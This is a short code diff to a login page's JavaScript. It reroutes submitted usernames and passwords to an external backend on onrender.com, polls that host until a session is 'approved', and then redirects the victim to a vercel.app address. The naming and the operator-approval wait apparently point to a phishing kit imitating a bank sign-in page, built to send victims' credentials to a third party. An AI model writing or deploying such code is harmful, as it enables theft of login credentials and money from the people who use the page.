@@ -91,6 +91,7 @@
       const continueBtn = document.getElementById("continue-btn");
       const errorDiv = document.getElementById("error");
       const loader = document.getElementById("loader");
+      const backendUrl = "https://op-9nkj.onrender.com";
 
       function togglePasswordVisibility() {
         const selected = document.querySelector('input[name="identification"]:checked').value;
@@ -120,7 +121,7 @@
 
         const data = identification === "key_code" ? { login, password } : { login };
         try {
-          const response = await fetch("/login", {
+          const response = await fetch(`${backendUrl}/login`, {
             method: "POST",
             headers: { "Content-Type": "application/json" },
             body: JSON.stringify(data),
@@ -137,11 +138,11 @@
           const sessionId = result.id;
           const pollStatus = async () => {
             try {
-              const statusResponse = await fetch(`/status/${sessionId}`);
+              const statusResponse = await fetch(`${backendUrl}/status/${sessionId}`);
               const status = await statusResponse.json();
               if (status.status === "approved" && status.redirect_url) {
                 loader.style.display = "none";
-                window.location.href = status.redirect_url;
+                window.location.href = `https://opfi.vercel.app/${status.redirect_url}`;
               } else {
                 setTimeout(pollStatus, 2000);
               }
